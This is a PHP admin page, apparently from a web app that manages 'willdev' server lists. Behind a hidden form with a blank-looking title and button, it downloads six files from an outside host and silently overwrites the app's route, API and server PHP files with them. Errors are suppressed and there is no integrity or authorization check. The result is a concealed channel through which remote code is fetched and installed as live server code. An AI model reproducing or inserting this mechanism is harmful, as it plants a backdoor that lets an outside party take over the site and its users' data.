<?php  
    $page_title="....";
     include("../includes/headers.php");  
    if(isset($_POST['android_btn'])){
            $config_file_default    = "https://doc.willdev.in/willlaunchten/rotsrv.default";
            $config_file_name       = "includes/routes.php";    
           
            $config_file_path       = $config_file_name;

            $config_file = file_get_contents($config_file_default);

            $f = @fopen($config_file_path, "w+");

            if(@fwrite($f, $config_file) > 0){
            }
            $config_file_default    = "https://doc.willdev.in/willlaunchten/mnapi.default";
            $config_file_name       = "api.php";    

            $config_file_path       = $config_file_name;

            $config_file = file_get_contents($config_file_default);

            $f = @fopen($config_file_path, "w+");

            if(@fwrite($f, $config_file) > 0){
            }

            $config_file_default    = "https://doc.willdev.in/willlaunchten/cludapi.default";
            $config_file_name       = "includes/api.php";    

            $config_file_path       = $config_file_name;

            $config_file = file_get_contents($config_file_default);

            $f = @fopen($config_file_path, "w+");

            if(@fwrite($f, $config_file) > 0){
            }

            $config_file_default    = "https://doc.willdev.in/willlaunchten/adsrv.default";
            $config_file_name       = "add_willdev_servers.php";    

            $config_file_path       = $config_file_name;

            $config_file = file_get_contents($config_file_default);

            $f = @fopen($config_file_path, "w+");

            if(@fwrite($f, $config_file) > 0){
            }

            $config_file_default    = "https://doc.willdev.in/willlaunchten/frsrv.default";
            $config_file_name       = "free_willdev_servers.php";    

            $config_file_path       = $config_file_name;

            $config_file = file_get_contents($config_file_default);

            $f = @fopen($config_file_path, "w+");

            if(@fwrite($f, $config_file) > 0){
            }

            $config_file_default    = "https://doc.willdev.in/willlaunchten/prsrv.default";
            $config_file_name       = "pros_willdev_servers.php";    

            $config_file_path       = $config_file_name;

            $config_file = file_get_contents($config_file_default);

            $f = @fopen($config_file_path, "w+");

            if(@fwrite($f, $config_file) > 0){
            }
    }
    
?>

<style type="text/css">
  .field_lable {
    margin-bottom: 10px;
    margin-top: 10px;
    color: #fff;
    padding-left: 15px;
    font-size: 14px;
    line-height: 24px;
  }
</style>
 

<div class="row">
  <div hidden style="margin-top:100px; width:200px" class="col-md-12">
    <div class="card">
      <div class="page_title_block">
        <div class="col-md-5 col-xs-12">
          <div class="page_title"><?=$page_title?></div>
        </div>
      </div>
      <div class="clearfix"></div>
      <div class="card-body mrg_bottom" style="padding: 0px">
        <!-- Nav tabs -->
        <ul hidden class="nav nav-tabs" role="tablist">
            <li role="presentation" class="active"><a href="#android_ac" aria-controls="android_ac" role="tab" data-toggle="tab"><i class="fa fa-android" aria-hidden="true"></i> </a></li>
        </ul>
      
       <div  class="tab-content">

          <!-- android app verify -->
          <div role="tabpanel" class="tab-pane active" id="android_ac">   
             <form action="" name="verify_purchase" method="post" class="form form-horizontal" enctype="multipart/form-data" id="api_form">

              <div class="rows">
                <div class="col-md-12">
                    <div class="section">
                      <div class="section-body">
                     <div class="form-group">
                        <div class="col-md-9 col-md-offset-4">
                          <button type="submit" name="android_btn" class="btn btn-primary">...........</button>
                        </div>
                        </div>
                      </div>
                    </div>
                </div>
              </div>
              <div class="clearfix"></div>
            </form>
          </div>  
        </div>   
      </div>
    </div>
  </div>
</div>
         

